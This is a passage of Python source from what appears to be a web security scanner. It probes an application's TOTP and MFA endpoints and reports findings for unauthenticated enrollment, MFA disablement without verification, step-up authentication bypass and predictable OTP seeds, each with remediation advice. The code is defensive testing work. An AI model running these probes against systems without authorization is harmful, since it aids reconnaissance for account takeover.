                 f'GET {base}{ep} -> HTTP {sc_g}. '
                 f'Unauthenticated enrollment allows an attacker to link their own '
                 f'authenticator to a victim account (account pre-hijack). '
                 f'Response excerpt: {(body_g or "")[:200]}')
            continue

        sc_p, body_p = _http_post(f'{base}{ep}',
                                  {'action': 'setup', 'step': '1'},
                                  headers={'Accept': 'application/json'},
                                  timeout=timeout)
        if sc_p in (200, 400, 422):
            _rec('HIGH', 'TOTP_ENROLLMENT_UNAUTH',
                 f'TOTP enrollment reachable without session token: '
                 f'POST {base}{ep} -> HTTP {sc_p}. '
                 f'Enrollment must validate authenticated session and CSRF token. '
                 f'Response excerpt: {(body_p or "")[:200]}')

    # --- 3. TOTP disable without step-up MFA verification ---
    for ep in DISABLE_ENDPOINTS:
        sc, body = _http_post(f'{base}{ep}',
                              {'confirm': 'true', 'reason': 'lost_device'},
                              headers={'Accept': 'application/json'},
                              timeout=timeout)
        if sc in (200, 204, 400):
            body_lower = (body or '').lower()
            if not any(kw in body_lower for kw in
                       ('otp', 'code', 'verify', 'confirm', 'totp', '2fa', 'token')):
                _rec('CRITICAL', 'TOTP_DISABLE_NO_VERIFICATION',
                     f'POST {base}{ep} returned HTTP {sc} without requesting OTP '
                     f'or step-up MFA verification in the response. '
                     f'TOTP removal must require the user to supply a valid TOTP code '
                     f'(or admin re-authentication) to prevent session-hijack-based '
                     f'MFA disablement leading to account takeover. '
                     f'Response excerpt: {(body or "")[:200]}')

    # --- 4. Step-up auth bypass across sensitive paths ---
    mfa_gate_seen = False
    unprotected = []
    for path in SENSITIVE_PATHS:
        sc, body = _http_get(f'{base}{path}',
                             headers={'Accept': 'application/json'},
                             timeout=timeout)
        if sc == 200:
            body_lower = (body or '').lower()
            if any(kw in body_lower for kw in ('mfa', 'totp', 'otp', '2fa', 'step-up', 'verify')):
                mfa_gate_seen = True
            else:
                unprotected.append(path)

    if unprotected:
        detail_prefix = (
            'Step-up MFA inconsistency: some sensitive paths enforce MFA re-verification '
            'while others do not. ' if mfa_gate_seen else
            'Sensitive administrative/payment paths return HTTP 200 without MFA challenge. '
        )
        _rec('HIGH', 'STEP_UP_AUTH_BYPASS',
             detail_prefix +
             f'Unprotected paths: {unprotected}. '
             f'An authenticated session (without step-up MFA) may access sensitive '
             f'endpoints. Enforce per-operation MFA re-verification for privileged actions.')

    # --- 5. Predictable OTP seed from user ID ---
    verify_ep = None
    for ep in ('/api/verify', '/api/otp', '/api/2fa', '/api/mfa/verify'):
        sc_t, _ = _http_get(f'{base}{ep}',
                            headers={'Accept': 'application/json'},
                            timeout=timeout)
        if sc_t in (200, 400, 405, 422):
            verify_ep = ep
            break

    if verify_ep:
        seed_lengths = []
        for uid in range(1, 6):
            sc_s, body_s = _http_post(
                f'{base}{verify_ep}',
                {'user_id': uid, 'id': uid, 'otp': '000000', 'code': '000000'},
                headers={'Accept': 'application/json'},
                timeout=timeout,
            )
            if sc_s is not None:
                seed_lengths.append(len(body_s or ''))

        if len(seed_lengths) >= 4:
            diffs = [seed_lengths[i + 1] - seed_lengths[i]
                     for i in range(len(seed_lengths) - 1)]
            if all(d > 0 for d in diffs) or all(d < 0 for d in diffs):
                direction = 'increasing' if diffs[0] > 0 else 'decreasing'
                _rec('HIGH', 'PREDICTABLE_OTP_SEED',
                     f'POST {base}{verify_ep} with sequential user IDs 1-5 and fixed OTP '
                     f'"000000" produced monotonically {direction} response lengths: '
                     f'{seed_lengths}. '
                     f'Structured per-user response variation suggests OTP seed or validation '
                     f'correlates with user-enumerable identity rather than a CSPRNG-generated '
                     f'per-user secret. TOTP seeds must be generated from a CSPRNG and stored '
                     f'independently of user-enumerable attributes (RFC 6238 §5.1).')

    return findings
